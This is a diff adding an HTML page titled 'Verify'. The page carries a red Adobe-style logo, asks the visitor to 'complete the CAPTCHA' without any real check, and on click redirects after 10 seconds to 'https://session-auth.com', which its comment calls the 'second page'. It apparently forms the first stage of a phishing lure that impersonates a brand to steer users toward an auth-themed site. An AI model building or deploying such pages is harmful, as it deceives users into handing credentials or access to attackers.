@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Verify</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: #ffffff;
+            font-family: 'Helvetica', Arial, sans-serif;
+            color: #000000;
+            overflow: hidden;
+        }
+        .particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: rgba(255, 0, 0, 0.5);
+            border-radius: 50%;
+            animation: float 5s infinite ease-in-out;
+        }
+        @keyframes float {
+            0% { transform: translateY(0) scale(1); opacity: 0.8; }
+            50% { transform: translateY(-50vh) scale(1.5); opacity: 0.2; }
+            100% { transform: translateY(-100vh) scale(1); opacity: 0; }
+        }
+        .verification-container {
+            position: relative;
+            text-align: center;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
+        }
+        .adobe-logo {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 20px;
+            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjQiIGhlaWdodD0iNjQiIHZpZXdCb3g9IjAgMCA2NCA2NCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTAgMEgyN0wzMiAzMkwzNyAwSDY0TDMyIDY0TDAgMFoiIGZpbGw9IiNmZjAwMDAiLz4KPC9zdmc+') no-repeat center;
+            background-size: contain;
+            animation: spiral 2s linear infinite, fade-in-out 2s ease-in-out infinite;
+        }
+        @keyframes spiral {
+            0% { transform: rotate(0deg) scale(1); }
+            100% { transform: rotate(360deg) scale(1); }
+        }
+        @keyframes fade-in-out {
+            0% { opacity: 0; }
+            50% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+        h1 {
+            font-size: 18px;
+            font-weight: bold;
+            margin: 0 0 10px;
+            text-transform: lowercase;
+            background: linear-gradient(90deg, #ff0000, #cc0000, #ff3333, #ff0000);
+            background-size: 200% 100%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: gradient-shift 3s ease-in-out infinite;
+        }
+        @keyframes gradient-shift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        p {
+            font-size: 14px;
+            margin: 0 0 20px;
+            color: #333333;
+        }
+        button {
+            padding: 10px 20px;
+            background: linear-gradient(90deg, #ff0000, #cc0000);
+            border: none;
+            border-radius: 5px;
+            color: #ffffff;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.7);
+        }
+    </style>
+    <script>
+        // Add particles dynamically
+        const particleContainer = document.createElement('div');
+        particleContainer.className = 'particles';
+        document.body.appendChild(particleContainer);
+        for (let i = 0; i < 20; i++) {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.left = Math.random() * 100 + 'vw';
+            particle.style.animationDelay = Math.random() * 5 + 's';
+            particleContainer.appendChild(particle);
+        }
+
+        // Redirect after 10 seconds on Verify click
+        document.addEventListener('DOMContentLoaded', function() {
+            const verifyButton = document.getElementById('verify-button');
+            verifyButton.addEventListener('click', function() {
+                setTimeout(function() {
+                    window.location.href = 'https://session-auth.com'; // Redirect to second page
+                }, 10000); // 10 seconds
+            });
+        });
+    </script>
+</head>
+<body>
+    <div class="verification-container">
+        <div class="adobe-logo"></div>
+        <h1></h1>
+        <p>Please complete the CAPTCHA to continue...</p>
+        <button id="verify-button">Verify</button>
+    </div>
+</body>
+</html>
